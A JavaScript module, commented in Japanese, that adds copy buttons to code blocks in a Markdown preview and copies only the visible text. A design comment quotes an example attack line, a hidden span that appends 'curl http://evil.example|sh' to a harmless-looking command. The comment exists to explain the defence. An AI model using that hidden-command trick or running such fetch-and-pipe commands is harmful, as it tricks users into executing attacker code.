import { messageOf } from "./app-context.js";
import { COPY_FEEDBACK_MS } from "./app-document.js";
import { t } from "./i18n.js";

/**
 * プレビュー内のコードブロックにコピーボタンを出す (Issue #165)。
 *
 * ## なぜ描画後の DOM に足すのか
 *
 * **Markdown → HTML の段階で混ぜない。** HTML 文字列にボタンを混ぜると、サニタイザ
 * (#21 / #59) の許可設定を広げることになり、**raw HTML の持ち込み経路を増やす**。
 * サニタイズ後の DOM へ後付けすれば、許可設定は 1 ミリも触らずに済む。
 *
 * ## Mermaid には出ない
 *
 * `src/renderer.ts` は Mermaid を `<pre class="mermaid">`（`<code>` を持たない）として
 * 出すので、**`pre > code` で選ぶだけで自然に外れる**。クラス名で除外する必要はない
 * —— 除外リストを持つと、`renderer.ts` の出力を変えたときに黙って壊れる。
 *
 * ## テキストファイルの表示にも出す
 *
 * `#155` で読めるようになった `.json` / `.ts` などの読み取り専用表示も、DOM の形は
 * 同じ `pre > code` （`app-preview.js` の `renderTextFile`）。**同じ形のものに同じ
 * ボタンを出す**ほうが、特例を設けるより説明が要らない。「ファイル全体をコピー」は
 * 読み取り専用で開いたときにこそ欲しい操作でもある。
 *
 * ## ボタンは `<pre>` の外に置く
 *
 * **`<pre>` の中に絶対配置すると、横に長い行で流れて見えなくなる。** `.markdown-body pre` は
 * `overflow-x: auto` なので、`right: 6px` は**スクロールする内容側**に貼り付く ——
 * 右へスクロールした量だけボタンが左へ動き、幅の広いブロックでは画面外へ出る（実測:
 * `scrollLeft` を最大にすると `right` が 1626px → 1580px へ移動した）。
 * スクロールしない包み（`.code-block`）を挟み、そこへ絶対配置すれば、
 * **どこまでスクロールしても右上に留まる**。
 *
 * 既存の CSS はすべて子孫セレクタ（`.markdown-body pre` / `.text-view code` 等）なので、
 * 1 段挟んでも当たり方は変わらない。Mermaid は `<code>` を持たないので包まない
 * （`renderMermaid` の `els.preview.querySelectorAll("pre.mermaid")` もそのまま効く）。
 *
 * ## 中身は「画面に出ている文字」だけを取る
 *
 * ハイライト（`<span class="hljs-*">`）が入っているので `innerHTML` は使えない ——
 * タグごとクリップボードに入る。かといって **`textContent` も使えない**:
 * **`display: none` の子孫の文字まで拾う**からで、これは実害のある差になる。
 *
 * `src/renderer.ts` は raw HTML の `<pre>` をそのまま通し、サニタイザ
 * （`public/sanitize-config.js`）が落とすのは `<style>` / `style` / `data-i18n*` だけなので、
 * **`<span hidden>` はそのまま残る**（実測）。つまり悪意ある md が
 *
 * ```html
 * <pre><code>curl https://good.example/i.sh | sh<span hidden>; curl http://evil.example|sh</span></code></pre>
 * ```
 *
 * と書くと、**画面には安全なコマンドしか見えないのに、ボタン 1 つで別のコマンドが
 * 混ざった文字列が端末へ貼られる**。#165 以前は手動の範囲選択しかなく、`display: none`
 * は選択に含まれなかったので、**これはコピーボタンが新しく開ける経路**。悪意ある md を
 * 脅威モデルに含めるのは #21 / #59 で確立済みの前提。
 *
 * そこで **描画されている部分だけを歩いて集める**（`visibleTextOf`）。
 * `innerText` は使わない —— 空白と改行を正規化するので、コードには使えない。
 *
 * ボタン自身は `<pre>` の外に置くので、ラベルが中身へ混ざることもない。
 */
/**
 * ボタンに付けるクラス。**見た目と、言語切替で拾い直すためだけに使う。**
 *
 * **二重付与の判定には使わない** —— サニタイザが `<button class="…">` を通すので、
 * 利用者の Markdown で同じ class の要素を作れてしまう（下の `decorated` を参照）。
 */
const COPY_BUTTON_CLASS = "code-copy-btn";

/** ボタンを右上に留めるための包み。**スクロールしないのが役目**。 */
const CODE_BLOCK_CLASS = "code-block";

/**
 * **画面に出ている文字だけ**を DOM 順で集める (Issue #165)。
 *
 * `textContent` は `display: none` の子孫まで拾うので、そのままでは
 * **見えていない文字列をクリップボードへ入れられる**（上のクラスコメント）。
 * 計算後のスタイルで隠れている部分木を飛ばす。
 *
 * **`aria-hidden` は見ない。** あれは支援技術から隠す宣言で、**画面には出ている** ——
 * 落とすと装飾目的の文字が消えて、コピー結果が見た目と食い違う。
 *
 * **`getComputedStyle` はクリック時にしか呼ばない**ので、描画の速さには効かない。
 *
 * @param {HTMLElement} root
 * @returns {string}
 */
export function visibleTextOf(root) {
  const view = root.ownerDocument?.defaultView;
  let out = "";
  /** @param {ChildNode} node */
  const walk = (node) => {
    if (node.nodeType === 3 /* TEXT_NODE */) {
      out += node.nodeValue ?? "";
      return;
    }
    if (node.nodeType !== 1 /* ELEMENT_NODE */) return;
    const el = /** @type {HTMLElement} */ (/** @type {unknown} */ (node));
    // **`getComputedStyle` が使えない環境では素通しする**（隠れていないものとして扱う）
    const style = view?.getComputedStyle?.(el);
    if (style && (style.display === "none" || style.visibility === "hidden")) return;
    for (const child of el.childNodes) walk(child);
  };
  for (const child of root.childNodes) walk(child);
  return out;
}

/**
 * `<code class="language-js">` から言語 ID を取る。取れなければ `null`。
 *
 * **形を確かめてから使う。** 値の素性はサーバの allowlist（`src/util/text-ext.ts`）や
 * `marked` 由来で確かだが、**読み上げ名として画面へ出す**ので、
 * `app-preview.js` の `isSafeLanguageId` と同じ形の検査を掛ける。
 *
 * @param {HTMLElement | null} code
 * @returns {string | null}
 */
export function languageOf(code) {
  const cls = [...(code?.classList ?? [])].find((c) => c.startsWith("language-"));
  const lang = cls?.slice("language-".length);
  return lang && /^[a-z0-9+#-]{1,32}$/.test(lang) ? lang : null;
}

/**
 * コピー対象のコードブロックを DOM 順で返す。
 *
 * **`pre > code` の直下関係で選ぶ。** `pre code` にすると、将来 `<pre>` の中へ
 * 入れ子の要素を足したときに意図しないものを拾う。
 *
 * @param {ParentNode} root
 * @returns {HTMLElement[]}
 */
function copyableCodeBlocks(root) {
  return /** @type {HTMLElement[]} */ (Array.from(root.querySelectorAll("pre > code")));
}

/** @param {import("./app-context.js").Ctx} ctx */
export function createCodeCopy(ctx) {
  const { els } = ctx;

  /**
   * 表示中のフィードバック。**`WeakMap` にする** —— キーは再描画のたびに DOM ごと
   * 捨てられるボタンなので、強参照で持つと外れた要素をタイマーが切れるまで掴む。
   *
   * @type {WeakMap<HTMLElement, ReturnType<typeof setTimeout>>}
   */
  const feedbackTimers = new WeakMap();

  /**
   * ボタンを付け終えた `<pre>`。**DOM の class で判定しない。**
   *
   * サニタイザは `USE_PROFILES: { html: true }` なので **`<button class="…">` を通す**
   * （`public/sanitize-config.js` が落とすのは `<style>` / `style` / `data-i18n*` だけ）。
   * つまり利用者が Markdown に raw HTML で `<pre><button class="code-copy-btn">` と書くと、
   * **「もう付いている」と誤判定して本物のボタンが出なくなる**（実測で成立する）。
   * 判定を JS 側に置けば、文書の中身では騙せない。
   *
   * `WeakSet` なので、再描画で `<pre>` ごと捨てられれば自動的に消える
   * （＝新しい `<pre>` には改めて付く）。
   *
   * @type {WeakMap<HTMLElement, HTMLElement>}
   */
  const decorated = new WeakMap();

  /**
   * **自分が作ったボタン。** `refresh()` はここからしか辿らない。
   *
   * `querySelectorAll(".code-copy-btn")` で拾うと、**利用者の md が同じ class を
   * 名乗った要素にも正規の i18n 文言を書き込む** —— `sanitize-config.js` が
   * `data-i18n*` を `FORBID_ATTR` に入れている理由（「i18n 機構がユーザーコンテンツへ
   * 漏れないようにする」）と同じ漏れが、経路を `class` に変えて再発する。
   *
   * **配列で持つ。** プレビューは丸ごと作り直されるので、`decorate()` の先頭で捨てる。
   *
   * @type {HTMLElement[]}
   */
  let ownButtons = [];

  /**
   * ボタンの読み上げ名とツールチップを当てる。
   *
   * **言語が分かるなら名前に混ぜる。** 混ぜないと、スクリーンリーダーのボタン一覧に
   * 「このコードブロックをコピー」が同名で並び、**どのブロックか区別できない**。
   * 言語は `<code class="language-js">` から取る（サーバの allowlist 由来なので
   * 素性は確かだが、**表示に使うので形も見る**）。
   *
   * @param {HTMLElement} button
   * @param {HTMLElement | null} code
   * @returns {void}
   */
  function applyLabels(button, code) {
    const lang = languageOf(code);
    const label = lang ? t("code.copy.aria.lang", { lang }) : t("code.copy.aria");
    button.setAttribute("aria-label", label);
    button.title = t("code.copy.title");
  }

  /**
   * 押した手応えを出す。**`app-document.js` の `flashCopied` と同じ見せ方**
   * （`is-copied` を付けて `COPY_FEEDBACK_MS` で外す）。
   *
   * @param {HTMLElement} button
   * @returns {void}
   */
  function flash(button) {
    button.classList.add("is-copied");
    const running = feedbackTimers.get(button);
    if (running) clearTimeout(running);
    feedbackTimers.set(
      button,
      setTimeout(() => {
        button.classList.remove("is-copied");
        feedbackTimers.delete(button);
      }, COPY_FEEDBACK_MS),
    );
  }

  /**
   * @param {HTMLElement} code
   * @param {HTMLElement} button
   * @returns {Promise<void>}
   */
  async function copyBlock(code, button) {
    try {
      // **`ctx.document` のものを使う。** `navigator.clipboard` が使えない
      // 非セキュアコンテキスト（`--share` で LAN から HTTP で開いたとき）の
      // フォールバックを既に持っているので、ここで書き直さない
      await ctx.document.copyTextToClipboard(visibleTextOf(code));
      flash(button);
      ctx.setStatus("ok", t("status.codeCopied"));
    } catch (err) {
      ctx.setStatus("error", t("status.copyFailed", { msg: messageOf(err) }));
    }
  }

  /**
   * プレビュー内のコードブロックにボタンを付ける。**描画のたびに呼ぶ。**
   *
   * `renderCurrentFile` は `innerHTML` の代入でプレビューを作り直すので、前回の
   * ボタンは DOM ごと消えている。**それでも二重付与を防ぐ** —— 将来ここが部分更新に
   * 変わったときに黙って 2 つ並ぶのを避けたい。判定は上の `decorated`（`WeakSet`）で、
   * **DOM の中身では騙せない**。
   *
   * @returns {void}
   */
  function decorate() {
    // **DOM から外れたボタンを持ち回らない。** 再描画で前回のボタンは捨てられている
    ownButtons = ownButtons.filter((b) => b.isConnected);
    for (const code of copyableCodeBlocks(els.preview)) {
      const pre = code.parentElement;
      if (!pre) continue;
      if (decorated.has(pre)) continue;

      // **スクロールしない包みを挟む**（上の「ボタンは `<pre>` の外に置く」）。
      // `replaceWith` → `appendChild` の順にすると、`<pre>` は文書内の同じ位置に残る
      const wrap = document.createElement("div");
      wrap.className = CODE_BLOCK_CLASS;
      pre.replaceWith(wrap);
      wrap.appendChild(pre);

      const button = document.createElement("button");
      button.type = "button";
      button.className = COPY_BUTTON_CLASS;
      // **`data-i18n` は使えない。** `applyI18n` は静的 DOM を対象にしており、
      // ここは描画のたびに作り直されるので、言語切替時は `refresh` が呼び直す
      applyLabels(button, code);
      // **アイコンは装飾。** 読み上げ名は `aria-label` が持つので「⧉」とは言われない
      button.textContent = "⧉";
      button.addEventListener("click", (ev) => {
        // **伝播を止める。** `app-document.js` はプレビューの click を委譲で受けて
        // `closest("a")` を引くので、`<a>` の中に書かれたコードブロックだと
        // コピーと同時に外部リンクバナー / 遷移まで走る
        ev.preventDefault();
        ev.stopPropagation();
        void copyBlock(code, button);
      });
      decorated.set(pre, button);
      ownButtons.push(button);
      // **`<pre>` の外（包みの直下）へ置く。** 中に入れると (1) ラベルが
      // `code.textContent` に混ざって中身が汚れ、(2) 横スクロールで流れる
      wrap.appendChild(button);
    }
  }

  /**
   * 言語切替のときにボタンの文言を当て直す (Issue #48 の `reapplyDynamicI18n` から呼ぶ)。
   *
   * @returns {void}
   */
  function refresh() {
    // **自分が作ったものだけ**（利用者の md が名乗った同名 class は触らない）
    for (const button of ownButtons) {
      if (!button.isConnected) continue;
      const code = button.parentElement?.querySelector("pre > code");
      applyLabels(button, /** @type {HTMLElement | null} */ (code));
    }
  }

  return { decorate, refresh };
}
